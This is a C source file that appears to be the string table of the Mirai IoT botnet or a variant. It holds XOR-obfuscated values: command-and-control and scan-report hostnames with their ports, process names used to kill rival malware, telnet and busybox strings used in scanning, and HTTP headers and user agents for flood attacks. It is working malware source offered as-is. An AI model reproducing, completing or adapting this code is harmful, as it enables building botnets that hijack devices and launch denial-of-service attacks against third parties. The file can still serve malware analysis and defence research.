#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdeadbeef;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_DOMAIN, (char*)util_decrypt("\x4B\x46\x4B\x06\x4B\x40\x49\x46\x4F\x4D\x45\x4D\x06\x4B\x47\x45\x28", 17), 30); // cnc.changeme.com
    add_entry(TABLE_CNC_PORT, (char*)util_decrypt("\x28\x3F", 2), 2);   // 23

    add_entry(TABLE_SCAN_CB_DOMAIN, (char*)util_decrypt("\x5A\x4D\x58\x47\x5A\x5C\x06\x4B\x40\x49\x46\x4F\x4D\x45\x4D\x06\x4B\x47\x45\x28", 20), 29); // report.changeme.com
    add_entry(TABLE_SCAN_CB_PORT, (char*)util_decrypt("\x93\xCD", 2), 2);         // 48101

    add_entry(TABLE_EXEC_SUCCESS, (char*)util_decrypt("\x44\x41\x5B\x5C\x4D\x46\x41\x46\x4F\x08\x5C\x5D\x46\x18\x28", 15), 15);

    // safe string https://youtu.be/dQw4w9WgXcQ
    add_entry(TABLE_KILLER_SAFE, (char*)util_decrypt("\x40\x5C\x5C\x58\x5B\x12\x07\x07\x51\x47\x5D\x5C\x5D\x06\x4A\x4D\x07\x4C\x79\x5F\x1C\x5F\x11\x7F\x4F\x70\x4B\x79\x28", 29), 29);
    add_entry(TABLE_KILLER_PROC, (char*)util_decrypt("\x07\x58\x5A\x47\x4B\x07\x28", 7), 7);
    add_entry(TABLE_KILLER_EXE, (char*)util_decrypt("\x07\x4D\x50\x4D\x28", 5), 5);
    add_entry(TABLE_KILLER_DELETED, (char*)util_decrypt("\x08\x00\x4C\x4D\x44\x4D\x5C\x4D\x4C\x01\x28", 11), 11);
    add_entry(TABLE_KILLER_FD, (char*)util_decrypt("\x07\x4E\x4C\x28", 4), 4);
    add_entry(TABLE_KILLER_ANIME, (char*)util_decrypt("\x06\x49\x46\x41\x45\x4D\x28", 7), 7);
    add_entry(TABLE_KILLER_STATUS, (char*)util_decrypt("\x07\x5B\x5C\x49\x5C\x5D\x5B\x28", 8), 8);
    add_entry(TABLE_MEM_QBOT, (char*)util_decrypt("\x7A\x6D\x78\x67\x7A\x7C\x08\x0D\x5B\x12\x0D\x5B\x28", 13), 13);
    add_entry(TABLE_MEM_QBOT2, (char*)util_decrypt("\x60\x7C\x7C\x78\x6E\x64\x67\x67\x6C\x28", 10), 10);
    add_entry(TABLE_MEM_QBOT3, (char*)util_decrypt("\x64\x67\x64\x66\x67\x6F\x7C\x6E\x67\x28", 10), 10);
    add_entry(TABLE_MEM_UPX, (char*)util_decrypt("\x74\x50\x1D\x10\x74\x50\x1C\x6C\x74\x50\x1C\x6D\x74\x50\x1C\x6D\x74\x50\x1C\x1B\x74\x50\x1D\x18\x74\x50\x1C\x1E\x74\x50\x1A\x1A\x28", 33), 33);
    add_entry(TABLE_MEM_ZOLLARD, (char*)util_decrypt("\x52\x47\x44\x44\x49\x5A\x4C\x28", 8), 8);
    add_entry(TABLE_MEM_REMAITEN, (char*)util_decrypt("\x6F\x6D\x7C\x64\x67\x6B\x69\x64\x61\x78\x28", 11), 11);

    add_entry(TABLE_SCAN_SHELL, (char*)util_decrypt("\x5B\x40\x4D\x44\x44\x28", 6), 6);
    add_entry(TABLE_SCAN_ENABLE, (char*)util_decrypt("\x4D\x46\x49\x4A\x44\x4D\x28", 7), 7);
    add_entry(TABLE_SCAN_SYSTEM, (char*)util_decrypt("\x5B\x51\x5B\x5C\x4D\x45\x28", 7), 7);
    add_entry(TABLE_SCAN_SH, (char*)util_decrypt("\x5B\x40\x28", 3), 3);
    add_entry(TABLE_SCAN_QUERY, (char*)util_decrypt("\x07\x4A\x41\x46\x07\x4A\x5D\x5B\x51\x4A\x47\x50\x08\x65\x61\x7A\x69\x61\x28", 19), 19);
    add_entry(TABLE_SCAN_RESP, (char*)util_decrypt("\x65\x61\x7A\x69\x61\x12\x08\x49\x58\x58\x44\x4D\x5C\x08\x46\x47\x5C\x08\x4E\x47\x5D\x46\x4C\x28", 24), 24);
    add_entry(TABLE_SCAN_NCORRECT, (char*)util_decrypt("\x46\x4B\x47\x5A\x5A\x4D\x4B\x5C\x28", 9), 9);
    add_entry(TABLE_SCAN_PS, (char*)util_decrypt("\x07\x4A\x41\x46\x07\x4A\x5D\x5B\x51\x4A\x47\x50\x08\x58\x5B\x28", 16), 16);
    add_entry(TABLE_SCAN_KILL_9, (char*)util_decrypt("\x07\x4A\x41\x46\x07\x4A\x5D\x5B\x51\x4A\x47\x50\x08\x43\x41\x44\x44\x08\x05\x11\x08\x28", 22), 22);

    add_entry(TABLE_ATK_VSE, (char*)util_decrypt("\x7C\x7B\x47\x5D\x5A\x4B\x4D\x08\x6D\x46\x4F\x41\x46\x4D\x08\x79\x5D\x4D\x5A\x51\x28", 21), 21);
    add_entry(TABLE_ATK_RESOLVER, (char*)util_decrypt("\x07\x4D\x5C\x4B\x07\x5A\x4D\x5B\x47\x44\x5E\x06\x4B\x47\x46\x4E\x28", 17), 17);
    add_entry(TABLE_ATK_NSERV, (char*)util_decrypt("\x46\x49\x45\x4D\x5B\x4D\x5A\x5E\x4D\x5A\x08\x28", 12), 12);

    add_entry(TABLE_ATK_KEEP_ALIVE, (char*)util_decrypt("\x6B\x47\x46\x46\x4D\x4B\x5C\x41\x47\x46\x12\x08\x43\x4D\x4D\x58\x05\x49\x44\x41\x5E\x4D\x28", 23), 23);
    add_entry(TABLE_ATK_ACCEPT, (char*)util_decrypt("\x69\x4B\x4B\x4D\x58\x5C\x12\x08\x5C\x4D\x50\x5C\x07\x40\x5C\x45\x44\x04\x49\x58\x58\x44\x41\x4B\x49\x5C\x41\x47\x46\x07\x50\x40\x5C\x45\x44\x03\x50\x45\x44\x04\x49\x58\x58\x44\x41\x4B\x49\x5C\x41\x47\x46\x07\x50\x45\x44\x13\x59\x15\x18\x06\x11\x04\x41\x45\x49\x4F\x4D\x07\x5F\x4D\x4A\x58\x04\x02\x07\x02\x13\x59\x15\x18\x06\x10\x28", 83), 83);
    add_entry(TABLE_ATK_ACCEPT_LNG, (char*)util_decrypt("\x69\x4B\x4B\x4D\x58\x5C\x05\x64\x49\x46\x4F\x5D\x49\x4F\x4D\x12\x08\x4D\x46\x05\x7D\x7B\x04\x4D\x46\x13\x59\x15\x18\x06\x10\x28", 32), 32);
    add_entry(TABLE_ATK_CONTENT_TYPE, (char*)util_decrypt("\x6B\x47\x46\x5C\x4D\x46\x5C\x05\x7C\x51\x58\x4D\x12\x08\x49\x58\x58\x44\x41\x4B\x49\x5C\x41\x47\x46\x07\x50\x05\x5F\x5F\x5F\x05\x4E\x47\x5A\x45\x05\x5D\x5A\x44\x4D\x46\x4B\x47\x4C\x4D\x4C\x28", 48), 48);
    add_entry(TABLE_ATK_SET_COOKIE, (char*)util_decrypt("\x5B\x4D\x5C\x6B\x47\x47\x43\x41\x4D\x00\x0F\x28", 12), 12);
    add_entry(TABLE_ATK_REFRESH_HDR, (char*)util_decrypt("\x5A\x4D\x4E\x5A\x4D\x5B\x40\x12\x28", 9), 9);
    add_entry(TABLE_ATK_LOCATION_HDR, (char*)util_decrypt("\x44\x47\x4B\x49\x5C\x41\x47\x46\x12\x28", 10), 10);
    add_entry(TABLE_ATK_SET_COOKIE_HDR, (char*)util_decrypt("\x5B\x4D\x5C\x05\x4B\x47\x47\x43\x41\x4D\x12\x28", 12), 12);
    add_entry(TABLE_ATK_CONTENT_LENGTH_HDR, (char*)util_decrypt("\x4B\x47\x46\x5C\x4D\x46\x5C\x05\x44\x4D\x46\x4F\x5C\x40\x12\x28", 16), 16);
    add_entry(TABLE_ATK_TRANSFER_ENCODING_HDR, (char*)util_decrypt("\x5C\x5A\x49\x46\x5B\x4E\x4D\x5A\x05\x4D\x46\x4B\x47\x4C\x41\x46\x4F\x12\x28", 19), 19);
    add_entry(TABLE_ATK_CHUNKED, (char*)util_decrypt("\x4B\x40\x5D\x46\x43\x4D\x4C\x28", 8), 8);
    add_entry(TABLE_ATK_KEEP_ALIVE_HDR, (char*)util_decrypt("\x43\x4D\x4D\x58\x05\x49\x44\x41\x5E\x4D\x28", 11), 11);
    add_entry(TABLE_ATK_CONNECTION_HDR, (char*)util_decrypt("\x4B\x47\x46\x46\x4D\x4B\x5C\x41\x47\x46\x12\x28", 12), 12);
    add_entry(TABLE_ATK_DOSARREST, (char*)util_decrypt("\x5B\x4D\x5A\x5E\x4D\x5A\x12\x08\x4C\x47\x5B\x49\x5A\x5A\x4D\x5B\x5C\x28", 18), 18);
    add_entry(TABLE_ATK_CLOUDFLARE_NGINX, (char*)util_decrypt("\x5B\x4D\x5A\x5E\x4D\x5A\x12\x08\x4B\x44\x47\x5D\x4C\x4E\x44\x49\x5A\x4D\x05\x46\x4F\x41\x46\x50\x28", 25), 25);

    add_entry(TABLE_HTTP_ONE, (char*)util_decrypt("\x65\x47\x52\x41\x44\x44\x49\x07\x1D\x06\x18\x08\x00\x7F\x41\x46\x4C\x47\x5F\x5B\x08\x66\x7C\x08\x19\x18\x06\x18\x13\x08\x7F\x67\x7F\x1E\x1C\x01\x08\x69\x58\x58\x44\x4D\x7F\x4D\x4A\x63\x41\x5C\x07\x1D\x1B\x1F\x06\x1B\x1E\x08\x00\x63\x60\x7C\x65\x64\x04\x08\x44\x41\x43\x4D\x08\x6F\x4D\x4B\x43\x47\x01\x08\x6B\x40\x5A\x47\x45\x4D\x07\x1D\x19\x06\x18\x06\x1A\x1F\x18\x1C\x06\x19\x18\x1B\x08\x7B\x49\x4E\x49\x5A\x41\x07\x1D\x1B\x1F\x06\x1B\x1E\x28", 111), 111);
    add_entry(TABLE_HTTP_TWO, (char*)util_decrypt("\x65\x47\x52\x41\x44\x44\x49\x07\x1D\x06\x18\x08\x00\x7F\x41\x46\x4C\x47\x5F\x5B\x08\x66\x7C\x08\x19\x18\x06\x18\x13\x08\x7F\x67\x7F\x1E\x1C\x01\x08\x69\x58\x58\x44\x4D\x7F\x4D\x4A\x63\x41\x5C\x07\x1D\x1B\x1F\x06\x1B\x1E\x08\x00\x63\x60\x7C\x65\x64\x04\x08\x44\x41\x43\x4D\x08\x6F\x4D\x4B\x43\x47\x01\x08\x6B\x40\x5A\x47\x45\x4D\x07\x1D\x1A\x06\x18\x06\x1A\x1F\x1C\x1B\x06\x19\x19\x1E\x08\x7B\x49\x4E\x49\x5A\x41\x07\x1D\x1B\x1F\x06\x1B\x1E\x28", 111), 111);
    add_entry(TABLE_HTTP_THREE, (char*)util_decrypt("\x65\x47\x52\x41\x44\x44\x49\x07\x1D\x06\x18\x08\x00\x7F\x41\x46\x4C\x47\x5F\x5B\x08\x66\x7C\x08\x1E\x06\x19\x13\x08\x7F\x67\x7F\x1E\x1C\x01\x08\x69\x58\x58\x44\x4D\x7F\x4D\x4A\x63\x41\x5C\x07\x1D\x1B\x1F\x06\x1B\x1E\x08\x00\x63\x60\x7C\x65\x64\x04\x08\x44\x41\x43\x4D\x08\x6F\x4D\x4B\x43\x47\x01\x08\x6B\x40\x5A\x47\x45\x4D\x07\x1D\x19\x06\x18\x06\x1A\x1F\x18\x1C\x06\x19\x18\x1B\x08\x7B\x49\x4E\x49\x5A\x41\x07\x1D\x1B\x1F\x06\x1B\x1E\x28", 110), 110);
    add_entry(TABLE_HTTP_FOUR, (char*)util_decrypt("\x65\x47\x52\x41\x44\x44\x49\x07\x1D\x06\x18\x08\x00\x7F\x41\x46\x4C\x47\x5F\x5B\x08\x66\x7C\x08\x1E\x06\x19\x13\x08\x7F\x67\x7F\x1E\x1C\x01\x08\x69\x58\x58\x44\x4D\x7F\x4D\x4A\x63\x41\x5C\x07\x1D\x1B\x1F\x06\x1B\x1E\x08\x00\x63\x60\x7C\x65\x64\x04\x08\x44\x41\x43\x4D\x08\x6F\x4D\x4B\x43\x47\x01\x08\x6B\x40\x5A\x47\x45\x4D\x07\x1D\x1A\x06\x18\x06\x1A\x1F\x1C\x1B\x06\x19\x19\x1E\x08\x7B\x49\x4E\x49\x5A\x41\x07\x1D\x1B\x1F\x06\x1B\x1E\x28", 110), 110);
    add_entry(TABLE_HTTP_FIVE, (char*)util_decrypt("\x65\x47\x52\x41\x44\x44\x49\x07\x1D\x06\x18\x08\x00\x65\x49\x4B\x41\x46\x5C\x47\x5B\x40\x13\x08\x61\x46\x5C\x4D\x44\x08\x65\x49\x4B\x08\x67\x7B\x08\x70\x08\x19\x18\x77\x19\x19\x77\x1E\x01\x08\x69\x58\x58\x44\x4D\x7F\x4D\x4A\x63\x41\x5C\x07\x1E\x18\x19\x06\x1F\x06\x1F\x08\x00\x63\x60\x7C\x65\x64\x04\x08\x44\x41\x43\x4D\x08\x6F\x4D\x4B\x43\x47\x01\x08\x7E\x4D\x5A\x5B\x41\x47\x46\x07\x11\x06\x19\x06\x1A\x08\x7B\x49\x4E\x49\x5A\x41\x07\x1E\x18\x19\x06\x1F\x06\x1F\x28", 117), 117);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
